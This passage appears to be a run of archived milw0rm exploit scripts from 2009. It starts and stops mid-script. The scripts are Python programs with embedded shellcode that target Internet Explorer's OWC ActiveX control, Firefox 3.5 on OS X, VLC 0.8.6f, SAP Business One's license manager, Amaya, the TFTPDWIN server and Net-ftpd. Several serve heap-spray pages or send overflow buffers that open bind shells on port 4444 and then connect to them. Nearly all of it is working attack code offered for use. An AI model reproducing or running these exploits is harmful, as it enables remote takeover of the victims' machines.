        # From Beta v2.0 by Berend-Jan Wever
        # http://www.milw0rm.com/exploits/656
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload
                
    def get_payload(self):
        # win32_exec - EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub
        # http://metasploit.com
        payload  = '\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73'
        payload += '\x13\x6f\x02\xb1\x0e\x83\xeb\xfc\xe2\xf4\x93\xea\xf5\x0e'
        payload += '\x6f\x02\x3a\x4b\x53\x89\xcd\x0b\x17\x03\x5e\x85\x20\x1a'
        payload += '\x3a\x51\x4f\x03\x5a\x47\xe4\x36\x3a\x0f\x81\x33\x71\x97'
        payload += '\xc3\x86\x71\x7a\x68\xc3\x7b\x03\x6e\xc0\x5a\xfa\x54\x56'
        payload += '\x95\x0a\x1a\xe7\x3a\x51\x4b\x03\x5a\x68\xe4\x0e\xfa\x85'
        payload += '\x30\x1e\xb0\xe5\xe4\x1e\x3a\x0f\x84\x8b\xed\x2a\x6b\xc1'
        payload += '\x80\xce\x0b\x89\xf1\x3e\xea\xc2\xc9\x02\xe4\x42\xbd\x85'
        payload += '\x1f\x1e\x1c\x85\x07\x0a\x5a\x07\xe4\x82\x01\x0e\x6f\x02'
        payload += '\x3a\x66\x53\x5d\x80\xf8\x0f\x54\x38\xf6\xec\xc2\xca\x5e'
        payload += '\x07\x7c\x69\xec\x1c\x6a\x29\xf0\xe5\x0c\xe6\xf1\x88\x61'
        payload += '\xd0\x62\x0c\x2c\xd4\x76\x0a\x02\xb1\x0e'
        return self.convert_to_utf16(payload)
    
    def get_exploit(self):
        exploit = '''
       
        function spray_heap()
        {
            var chunk_size, payload, nopsled;
            
            chunk_size = 0x100000;
            payload = unescape("<PAYLOAD>");
            nopsled = unescape("<NOP>");
            while (nopsled.length < chunk_size)
                nopsled += nopsled;
            nopsled_len = chunk_size - (payload.length + 20);        
            nopsled = nopsled.substring(0, nopsled_len);
            heap_chunks = new Array();
            for (var i = 0 ; i < <CHUNKS> ; i++)
                heap_chunks[i] = nopsled + payload;
        }    
         
        function trigger_bug()
        {
            var obj, arr;
           
            try {
                obj = new ActiveXObject("OWC10.Spreadsheet");
            } catch (err) { 
                try {
                    obj = new ActiveXObject("OWC11.Spreadsheet");	
           		} catch (err) {
                    window.location = 'about:blank';	
           		}
            }
            arr = new Array();
            arr.push(1);
            arr.push(2);
            arr.push(0);
            arr.push(window);
            for (var i = 0 ; i < arr.length ; i++) {
                for (var j = 0 ; j < 10 ; j++) {
                    try {
                        obj.Evaluate(arr[i]);
                    } catch (err) {}
                }
            }        
            window.status = arr[3] + "";
            for (var j = 0 ; j < 10 ; j++) {
                try {
                    obj.msDataSource(arr[3]);
                } catch (err) {}
            }
        }

        spray_heap();
        trigger_bug();
				
        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = exploit.replace('<NOP>', '%u0b0c%u0b0c')
        exploit = exploit.replace('<CHUNKS>', '100')      
        exploit = '<html><body><script>' + exploit + '</script></body></html>'
        return exploit 

    def log_request(self, *args, **kwargs):
        pass
        
    def do_GET(self):
        try:
            if self.path == '/':
                print
                print '[-] Incoming connection from %s' % self.client_address[0]
                self.send_response(200) 
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                print '[-] Sending exploit to %s ...' % self.client_address[0]
                self.wfile.write(self.get_exploit())
                print '[-] Exploit sent to %s' % self.client_address[0]
        except: 
            print '[*] Error : an error has occured while serving the HTTP request'
            exit_program()
            
def exit_program():
    print '[-] Exiting ...'
    sys.exit(0)
                       
def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port (between 1024 and 65535)]' % sys.argv[0]
        sys.exit(0)
    try:
        port = int(sys.argv[1])
        if port < 1024 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer(('', port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print '[-] Web server is running at http://%s:%d/' % (ip, port)
            try:
                serv.serve_forever()
            except:
                exit_program()
        except socket.error:
            print '[*] Error : a socket error has occurred'
            exit_program()    
    except ValueError:
        print '[*] Error : an invalid port number was given'
        exit_program()
            
if __name__ == '__main__':
    main()

# milw0rm.com [2009-07-21]
#!/usr/bin/env python
#######################################################
#
# FireFox 3.5 Heap Spray OS X Exploit
# Modified by: Dr_IDE
# Originally Discovered by: Simon Berry-Bryne
# Pythonized by: David Kennedy (ReL1K) @ SecureState
# Thanks to HDM
# Tested on OS X 10.5.7
#
#######################################################
from BaseHTTPServer import HTTPServer 
from BaseHTTPServer import BaseHTTPRequestHandler 
import sys 

class myRequestHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.printCustomHTTPResponse(200)
    if self.path == "/":
        target=self.client_address[0]
        self.wfile.write("""
<html>
<head>
<title>Firefox 3.5 Vulnerability</title>
Firefox 3.5 Heap Spray Exploit for OSX
</br>
Mozilla, We have a problem.
Bind Shell Delivered on Port: 4444
</br>
<div id="content">
<p><FONT>                             </FONT></p>
<p><FONT>Ihazacrashihazacrash</FONT></p>
<p><FONT>Ohnoesihazacrashhazcrash</FONT></p>
<p><FONT>Aaaaahhhhh  </FONT></p>
</div>
<script language=JavaScript>

// osx/x86/vforkshell_bind_tcp - 152 bytes
// http://www.metasploit.com
// AppendExit=false, PrependSetresuid=false, 
// PrependSetuid=false, LPORT=4444, RHOST=, 
// PrependSetreuid=false
var shellcode = unescape("%uc031%u5099%u5040%u5040%ub052%ucd61%u0f80%u7e82%u0000%u8900%u52c6%u5252%u0068%u1102%u895c%u6ae3%u5310%u5256%u68b0%u80cd%u6772%u5652%ub052%ucd6a%u7280%u525e%u5652%ub052%ucd1e%u7280%u8954%u31c7%u83db%u01eb%u5343%u5357%u5ab0%u80cd%u4372%ufb83%u7503%u31f1%u50c0%u5050%ub050%ucd3b%u9080%u3c90%u752d%ub009%ucd42%u8380%u00fa%u1774%uc031%u6850%u2f2f%u6873%u2f68%u6962%u896e%u50e3%u5350%ub050%ucd3b%u3180%u50c0%ue389%u5050%u5053%ub050%ucd07%u3180%u50c0%u4050%u80cd");
var oneblock = unescape("%u4141%u4141");
var fullblock = oneblock;
while (fullblock.length<0x60000)  
{
    fullblock += fullblock;
}
sprayContainer = new Array();
for (i=0; i<600; i++)  
{
    sprayContainer[i] = fullblock + shellcode;
}
var searchArray = new Array()
 
function escapeData(data)
{
 var i;
 var c;
 var escData='';
 for(i=0;i<data.length;i++)
  {
   c=data.charAt(i);
   if(c=='&' || c=='?' || c=='=' || c=='%' || c==' ') c = escape(c);
   escData+=c;
  }
 return escData;
}
function DataTranslator(){
    searchArray = new Array();
    searchArray[0] = new Array();
    searchArray[0]["str"] = "blah";
    var newElement = document.getElementById("content")
    if (document.getElementsByTagName) {
        var i=0;
        pTags = newElement.getElementsByTagName("p")
        if (pTags.length > 0)  
        while (i<pTags.length)
        {
            oTags = pTags[i].getElementsByTagName("font")
            searchArray[i+1] = new Array()
            if (oTags[0])  
            {
                searchArray[i+1]["str"] = oTags[0].innerHTML;
            }
            i++
        }
    }
}
 
function GenerateHTML()
{
    var html = "";
    for (i=1;i<searchArray.length;i++)
    {
        html += escapeData(searchArray[i]["str"])
    }    
}
DataTranslator();
GenerateHTML()
</script>
</body>
</html>""")
        print ("\n\n[*] Exploit Sent. [*]\n[*] Wait about 15 seconds and attempt to connect.[*]\n[*] Connect to IP Address: %s and port 4444 [-]" % (target))

  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header("Content-type", "text/html")
    self.send_header("Server", "myRequestHandler")
    self.end_headers()

httpd = HTTPServer(('', 80), myRequestHandler)

print ("""
#######################################################
#
# FireFox 3.5 Heap Spray OS X Exploit
# Modified by: Dr_IDE
# Originally discovered by: Simon Berry-Bryne
# Pythonized: David Kennedy (ReL1K) @ SecureState
# Thanks to HDM
# Tested on OS X 10.5.7
#
#######################################################
""")
print ("Listening on port 80.")
print ("Have someone connect to you.")
print ("\nType <control>-c to exit..")
try:
     httpd.handle_request()
     httpd.serve_forever() 
except KeyboardInterrupt:
       print ("\n\n[*] Exiting Exploit.\n\n")
       sys.exit(1)

# milw0rm.com [2009-07-24]
#!/usr/bin/python
#[*] Exploit     :      	VLC Media Player 0.8.6f smb:// URI Handling Remote BOF Exploit (univ)
#[*] Credits	 :		Pankaj Kohli
#[*] Exploit     : 		His0k4


header1=(
"\x3c\x3f\x78\x6d\x6c\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31"
"\x2e\x30\x22\x20\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22\x55\x54"
"\x46\x2d\x38\x22\x3f\x3e\x0a\x3c\x70\x6c\x61\x79\x6c\x69\x73\x74"
"\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x22\x20\x78\x6d\x6c"
"\x6e\x73\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x78\x73\x70\x66\x2e"
"\x6f\x72\x67\x2f\x6e\x73\x2f\x30\x2f\x22\x20\x78\x6d\x6c\x6e\x73"
"\x3a\x76\x6c\x63\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77"
"\x2e\x76\x69\x64\x65\x6f\x6c\x61\x6e\x2e\x6f\x72\x67\x2f\x76\x6c"
"\x63\x2f\x70\x6c\x61\x79\x6c\x69\x73\x74\x2f\x6e\x73\x2f\x30\x2f"
"\x22\x3e\x0a\x09\x3c\x74\x69\x74\x6c\x65\x3e\x50\x6c\x61\x79\x6c"
"\x69\x73\x74\x3c\x2f\x74\x69\x74\x6c\x65\x3e\x0a\x09\x3c\x74\x72"
"\x61\x63\x6b\x4c\x69\x73\x74\x3e\x0a\x09\x09\x3c\x74\x72\x61\x63"
"\x6b\x3e\x0a\x09\x09\x09\x3c\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x3e"
"\x73\x6d\x62\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f"
"\x6d\x40\x77\x77\x77\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f"
"\x6d\x2f\x66\x6f\x6f\x2f\x23\x7b")

header2=(
"\x7d\x3c\x2f\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x3e\x0a\x09\x09\x09"
"\x3c\x65\x78\x74\x65\x6e\x73\x69\x6f\x6e\x20\x61\x70\x70\x6c\x69"
"\x63\x61\x74\x69\x6f\x6e\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x77"
"\x77\x77\x2e\x76\x69\x64\x65\x6f\x6c\x61\x6e\x2e\x6f\x72\x67\x2f"
"\x76\x6c\x63\x2f\x70\x6c\x61\x79\x6c\x69\x73\x74\x2f\x30\x22\x3e"
"\x0a\x09\x09\x09\x09\x3c\x76\x6c\x63\x3a\x69\x64\x3e\x30\x3c\x2f"
"\x76\x6c\x63\x3a\x69\x64\x3e\x0a\x09\x09\x09\x3c\x2f\x65\x78\x74"
"\x65\x6e\x73\x69\x6f\x6e\x3e\x0a\x09\x09\x3c\x2f\x74\x72\x61\x63"
"\x6b\x3e\x0a\x09\x3c\x2f\x74\x72\x61\x63\x6b\x4c\x69\x73\x74\x3e"
"\x0a\x3c\x2f\x70\x6c\x61\x79\x6c\x69\x73\x74\x3e\x0a\x0a")

#alpha2 encoded
popup_msg=(
"TY777777777777777777777777777777777QZjAXP0A0AkAAQ2AB2BB0"
"BBABXP8ABuJIXkweaHrJwpf02pQzePMhyzWwSuQnioXPOHuBxKnaQlkO"
"jpJHIvKOYokObPPwRN1uqt5PA")

payload =   header1
payload += "\x41"*96
payload += "\x4A\x21\x51\x68" # push esp;retn printable 
payload += popup_msg
payload += "\x41"*43
payload += header2

try:
    out_file = open("exploit.xspf","w")
    out_file.write(payload)
    out_file.close()
    print("\nExploit file created!\n")
except:
    print "Error"

# milw0rm.com [2009-07-31]
#!/usr/bin/python
import socket, time


#########################################INFO################################################
# NT_Naming_Service.exe (License Manager 2005 for SAP Business One 2005-A) is               #
# vulnerable to a stack-based buffer overflow allowing for full system compromise by        #
# an unauthenticated user that has TCP/IP access to SAP's license service on TCP port 30000.#
# Mike Arnold ---> mikey27 .::at::. hotmail.com                                             #
############################################################################################


header = ("########################################################################\r\n"
"#    SAP Business One 2005-A License Manager remote overflow PoC    #\r\n"     
"#           Tested on 2005-A (6.80.123) SP:00 PL:06                 #\r\n"
"#                 2005-A (6.80.320) SP:01 PL:34                 #\r\n"
"#              OS: Windows Server 2003 R2 Std/Ent Service Pack 2      #\r\n"
"#             Coded by Bruk0ut - mikey27 .::at::. hotmail.com       #\r\n"
"########################################################################\r\n")


#metasploit windows/exec - notepad.exe x86/shikata_ga_nai 152 bytes
sc = ("\xbf\xd6\x21\x7d\x3b\xda\xdb\xd9\x74\x24\xf4\x33\xc9\x5d\xb1"
"\x20\x31\x7d\x13\x83\xc5\x04\x03\x7d\xd9\xc3\x88\xc7\x0d\x47"
"\x73\x38\xcd\xc3\x36\x04\x46\xaf\xbd\x0c\x59\xbf\x35\xa3\x41"
"\xb4\x15\x1c\x70\x21\xe0\xd7\x46\x3e\xf2\x09\x97\x80\x6c\x79"
"\x53\xc0\xfb\x85\x9a\x0b\x0e\x8b\xde\x67\xe5\xb0\x8a\x53\x02"
"\xb2\xd7\x17\x55\x18\x16\xc3\x0c\xeb\x14\x58\x5a\xb4\x38\x5f"
"\xb7\xc0\x5c\xd4\x46\x3c\xd5\xb6\x6c\xc6\x26\x19\x5c\x30\xc8"
"\xf0\xfa\x37\x4e\xcd\x89\x08\x42\xa6\xfe\x94\xf7\x33\x96\xac"
"\x8e\xbc\xe4\x6d\xfa\x6c\x83\x9d\x70\x88\x0c\x36\x1c\x6f\x38"
"\xc8\x4b\x6f\xda\xbb\x1c\xfb\x40\x34\x83\x67\xa5\xd1\x3b\x0d"
"\xb9\x13")

#JMP ESP 0x773a73fb User32.dll - Server2k3 R2 STD/ENT - SP2
ret = '\xfb\x73\x3a\x77'
giop_header = '\x47\x49\x4f\x50\x01\x00\x01\x00'
buff = giop_header + '\x2f\x5c' * 500 + "A" * 24 + ret + '\x90' * 44 + sc + '\x90' * 384

print (header)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect (('10.0.0.241',30000))
s.setblocking(0)

s.send(buff)
time.sleep(1)
print ("done!")

s.close()

# milw0rm.com [2009-08-01]
#!/usr/bin/python
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[+] Bug :	 Amaya 11.2 W3C Editor/Browser (defer) Remote BOF Exploit (SEH)
#[+] Tested on : Xp sp3 (en) under (vb)
#[+] Refer : 	 http://www.milw0rm.com/exploits/8314
#[+] Exploit : 	 His0k4
#[+] Greetz : 	 All friends (DZ)

#[x] Note : The html file must be browsed from a webserver

#win32_exec calc encoded with alpha2=>374 bytes.
shellcode = (
"JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
"TiKyosYyyN8YzN9IT4utL4SkoqRSwcUOJKKJ7rMSzKKLIrkDysv"
"cONtBUOjKrQCwEscPlFEWcWJJVuk9pPkCPqqMeokZTQPKLTkoQa"
"ws8qYJFZmKLsbOVZBVvxEzfPdOwnQ921l6Q4OOyN362JfnrQSmU"
"kkZr1e4OdhgnQLISp9gkKZIntL7qa5Sl4QroV5vUKDhxKyR3KSP"
"MjTrMJvKnbVnlTLkKFOyPozWf7NiqgXcTQVkMDbKqZtBuOXkT1p"
"jusNTJkL4cOMmPszZmLtkmQsbRWUKppS6SpMSQrilNum5nMYmL8"
"k8ok2NSLjKkJ32WzA")

payload =  "<script defer=\""
payload += "\x41"*6914		#change this value if needed
payload += "\x74\x06\x41\x41"	#short jump
payload += "\x50\x1A\x03\x10"	#pop pop ret somewhere
payload += "\x61"*13	# popad
payload += "\x52\xC3"	# push edx,retn C3 not mangled ouf!
payload += "\x44"*668	# padding
payload += shellcode
payload += "\x45"*5000	# result
payload += "\">"

try:
    out_file = open("exploit.html","w")
    out_file.write(payload)
    out_file.close()
    print("\nExploit file created!\n")
except:
    print "Error"

# milw0rm.com [2009-08-03]
#!/usr/bin/python

#ProSysInfo TFTP Server TFTPDWIN 0.4.2
#Coded by Wraith

import os
import sys
import struct
import socket
import time


print "\nProSysInfo TFTP Server TFTPDWIN 0.4.2"
print "Note: This vuln is sensitive to different buffer length\n"
 
if len(sys.argv)!=2:
        print "Usage: tftpdwin.py <ip>"
        sys.exit(0)


	
buffer = "\x00\x01\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
buffer += "\x8b\xc3\x66\x05\x12\x01\x50\xc3" + "\x90"*57

buffer += "\x59\x81\xc9\xd3\x62\x30\x20\x41\x43\x4d\x64"
buffer += "\x64\x99\x96\x8D\x7E\xE8\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C"
buffer += "\x8B\x09\x8B\x69\x08\xB6\x03\x2B\xE2\x66\xBA\x33\x32\x52\x68\x77"
buffer += "\x73\x32\x5F\x54\xAC\x3C\xD3\x75\x06\x95\xFF\x57\xF4\x95\x57\x60"
buffer += "\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF"
buffer += "\x47\x8B\x34\xBB\x03\xF5\x99\xAC\x34\x71\x2A\xD0\x3C\x71\x75\xF7"
buffer += "\x3A\x54\x24\x1C\x75\xEA\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B"
buffer += "\x59\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3B\xF7\x75\xB4"
buffer += "\x5E\x54\x6A\x02\xAD\xFF\xD0\x88\x46\x13\x8D\x48\x30\x8B\xFC\xF3"
buffer += "\xAB\x40\x50\x40\x50\xAD\xFF\xD0\x95\xB8\x02\xFF\x11\x5c\x32\xE4"
buffer += "\x50\x54\x55\xAD\xFF\xD0\x85\xC0\x74\xF8\xFE\x44\x24\x2D\xFE\x44"
buffer += "\x24\x2c\x83\xEF\x6C\xAB\xAB\xAB\x58\x54\x54\x50\x50\x50\x54\x50"
buffer += "\x50\x56\x50\xFF\x56\xE4\xFF\x56\xE8\x90\x90\x90\x90\x90\x90\x90"
buffer += "\x42\xfb\x61\x40\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00"


target = sys.argv[1]
def Connect(target):
	connect = "telnet " + target + " 4444"
	os.system(connect)
	
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
	s.sendto(buffer, (target,69))
	print "[*] Initiating Buffer Overflow"
	time.sleep(2)
	print "[*] Attempting Connection to Remote Host"
	time.sleep(2)
	print "[*] Please Wait...\n"
	time.sleep(3)
	Connect(target)
	print "\nClosing Remote Connection\n"
	sys.exit(0)
except:
	print "Goodbye\n"	

# milw0rm.com [2009-08-18]
#
# Net-ftpd 4.2.2 user autentication b0f exploit (0day)
# coded by Sergio 'shadown' Alvarez
#

import struct
import socket
import sys
import time

class warftpd:
	def __init__(self, host, port):
		self.host		= host
		self.port		= port
		self.bsize		= 512
		self.ebpaddr	= 0xcacacaca
		self.retaddr	= 0xdeadbeef
		self.sctype		= 'findskt'
		self.scport		= None

	def setebpaddr(self, addr):
		self.ebpaddr = addr

	def setretaddr(self, addr):
		self.retaddr = addr

	def setbsize(self, size):
		self.bsize = size

	def setsctype(self, type):
		self.sctype = type

	def setscport(self, port):
		self.scport = port

	def genbuffer(self):
		## 
		# Alpha port bind 4444, thanx metasploit
		## 
		sc = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
		sc += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x49\x51\x5a\x6a\x46"
		sc += "\x58\x30\x41\x31\x50\x42\x41\x6b\x42\x41\x56\x42\x32\x42\x41\x32"
		sc += "\x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x69\x79\x6b\x4c\x70"
		sc += "\x6a\x78\x6b\x70\x4f\x6d\x38\x59\x69\x49\x6f\x69\x6f\x6b\x4f\x61"
		sc += "\x70\x4c\x4b\x70\x6c\x35\x74\x66\x44\x6c\x4b\x73\x75\x45\x6c\x4c"
		sc += "\x4b\x31\x6c\x55\x55\x62\x58\x54\x41\x38\x6f\x6e\x6b\x50\x4f\x57"
		sc += "\x68\x4c\x4b\x33\x6f\x65\x70\x56\x61\x38\x6b\x69\x73\x50\x30\x37"
		sc += "\x39\x6c\x4b\x50\x34\x4e\x6b\x77\x71\x58\x6e\x34\x71\x4b\x70\x4a"
		sc += "\x39\x6e\x4c\x6b\x34\x4f\x30\x64\x34\x35\x57\x6b\x71\x6b\x7a\x56"
		sc += "\x6d\x53\x31\x78\x42\x7a\x4b\x69\x64\x35\x6b\x32\x74\x61\x34\x76"
		sc += "\x48\x44\x35\x4d\x33\x4c\x4b\x63\x6f\x56\x44\x37\x71\x5a\x4b\x50"
		sc += "\x66\x6e\x6b\x66\x6c\x32\x6b\x4c\x4b\x31\x4f\x45\x4c\x75\x51\x38"
		sc += "\x6b\x34\x43\x76\x4c\x4c\x4b\x6b\x39\x72\x4c\x45\x74\x47\x6c\x63"
		sc += "\x51\x7a\x63\x45\x61\x4f\x30\x53\x54\x4e\x6b\x67\x30\x30\x30\x4c"
		sc += "\x4b\x63\x70\x34\x4c\x4e\x6b\x34\x30\x37\x6c\x4e\x4d\x4e\x6b\x71"
		sc += "\x50\x55\x58\x61\x4e\x73\x58\x6e\x6e\x70\x4e\x64\x4e\x68\x6c\x70"
		sc += "\x50\x4b\x4f\x6b\x66\x30\x31\x49\x4b\x50\x66\x52\x73\x53\x56\x30"
		sc += "\x68\x74\x73\x57\x42\x43\x58\x61\x67\x61\x63\x75\x62\x63\x6f\x36"
		sc += "\x34\x49\x6f\x58\x50\x45\x38\x4a\x6b\x4a\x4d\x39\x6c\x57\x4b\x56"
		sc += "\x30\x69\x6f\x5a\x76\x43\x6f\x4d\x59\x78\x65\x35\x36\x4c\x41\x48"
		sc += "\x6d\x66\x68\x37\x72\x71\x45\x62\x4a\x64\x42\x6b\x4f\x38\x50\x35"
		sc += "\x38\x6e\x39\x64\x49\x7a\x55\x4c\x6d\x31\x47\x79\x6f\x6e\x36\x56"
		sc += "\x33\x62\x73\x72\x73\x30\x53\x71\x43\x77\x33\x30\x53\x67\x33\x36"
		sc += "\x33\x59\x6f\x7a\x70\x30\x66\x70\x68\x76\x71\x73\x6c\x41\x76\x72"
		sc += "\x73\x6f\x79\x7a\x41\x4c\x55\x32\x48\x4c\x64\x44\x5a\x74\x30\x4a"
		sc += "\x67\x56\x37\x49\x6f\x4a\x76\x51\x7a\x44\x50\x42\x71\x53\x65\x6b"
		sc += "\x4f\x38\x50\x30\x68\x6f\x54\x4e\x4d\x44\x6e\x79\x79\x30\x57\x79"
		sc += "\x6f\x68\x56\x41\x43\x30\x55\x4b\x4f\x4a\x70\x52\x48\x4d\x35\x67"
		sc += "\x39\x6f\x76\x30\x49\x33\x67\x6b\x4f\x4a\x76\x72\x70\x63\x64\x61"
		sc += "\x44\x30\x55\x49\x6f\x38\x50\x4c\x53\x65\x38\x4b\x57\x72\x59\x6a"
		sc += "\x66\x63\x49\x72\x77\x69\x6f\x78\x56\x41\x45\x4b\x4f\x6a\x70\x70"
		sc += "\x66\x70\x6a\x63\x54\x61\x76\x30\x68\x43\x53\x72\x4d\x6c\x49\x68"
		sc += "\x65\x53\x5a\x70\x50\x53\x69\x76\x49\x6a\x6c\x6f\x79\x4d\x37\x61"
		sc += "\x7a\x67\x34\x4e\x69\x59\x72\x37\x41\x6b\x70\x6a\x53\x4c\x6a\x59"
		sc += "\x6e\x53\x72\x56\x4d\x59\x6e\x33\x72\x64\x6c\x6c\x53\x4e\x6d\x42"
		sc += "\x5a\x35\x68\x4c\x6b\x6e\x4b\x4e\x4b\x72\x48\x44\x32\x6b\x4e\x4d"
		sc += "\x63\x54\x56\x79\x6f\x43\x45\x32\x64\x6b\x4f\x6b\x66\x33\x6b\x53"
		sc += "\x67\x30\x52\x63\x61\x66\x31\x52\x71\x53\x5a\x74\x41\x56\x31\x32"
		sc += "\x71\x73\x65\x50\x51\x4b\x4f\x5a\x70\x32\x48\x6c\x6d\x4a\x79\x47"
		sc += "\x75\x48\x4e\x62\x73\x6b\x4f\x7a\x76\x61\x7a\x6b\x4f\x6b\x4f\x35"
		sc += "\x67\x6b\x4f\x68\x50\x6e\x6b\x31\x47\x4b\x4c\x6d\x53\x68\x44\x41"
		sc += "\x74\x4b\x4f\x4e\x36\x36\x32\x49\x6f\x68\x50\x75\x38\x6c\x30\x4f"
		sc += "\x7a\x56\x64\x31\x4f\x43\x63\x59\x6f\x4a\x76\x4b\x4f\x38\x50\x46"
		
		# shellcode
		#sc		=	"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"
		#sc		+=	"\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"
		#sc		+=	"\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"
		#sc		+=	"\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"
		#sc		+=	"\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"
		#sc		+=	"\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"
		#sc		+=	"\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"
		#sc		+=	"\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"
		#sc		+=	"\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"
		#sc		+=	"\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"
		#sc		+=	"\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"
		#sc		+=	"\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"
		#sc		+=	"\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"
		#sc		+=	"\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"
		#sc		+=	"\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"
		#sc		+=	"\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"
		#sc		+=	"\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"
		#sc		+=	"\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"
		#sc		+=	"\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"
		#sc		+=	"\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"
		#sc		+=	"\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"
		#sc		+=	"\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"
		#sc		+=	"\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"
		#sc		+=	"\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"
		#sc		+=	"\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"
		# other stuff
		nops	=	"\x41"*(self.bsize-len(sc)-50)
		ebp	=	struct.pack('<L', self.ebpaddr)
		# check if the value is an integer, otherwise it should be a string
		if self.retaddr.__class__.__name__ == 'int':
			ret	=	struct.pack('<L', self.retaddr)
		else:
			ret	=	self.retaddr
		# assemble buffer to send
		buffer	=	"USER "
		buffer	+=	nops
		buffer	+=	sc
		buffer	+=	'\x42'*(50-4)
		buffer	+=	ebp
		buffer	+=	ret
		return buffer

	def exploit(self):
		# connect
		skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			skt.connect((self.host, self.port))
		except socket.error, err:
			print "[-] Error: %s" % err[1]
			return None
		print "[+] Connected to %s:%d" % (self.host, self.port)
		# recv banner
		print "[+] Receiving Banner"
		res = skt.recv(100)
		print res
		# send payload
		time.sleep(1)
		print "[+] Sending payload"
		skt.send(self.genbuffer())
		time.sleep(2) # test on mcafee anti-b0f
		skt.close()
		# if successfull connect to the shell
		time.sleep(2)
		skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			skt.connect((self.host, 4444))
		except socket.error, err:
			print "[-] Error: %s" % err[1]
			print "[-] Explotation failed\n[-] Daemon should be dead..."
			return None
		print "[+] Connected to shell at %s on port %d" % (self.host, 4444)
		res = skt.recv(1024)
		if res:
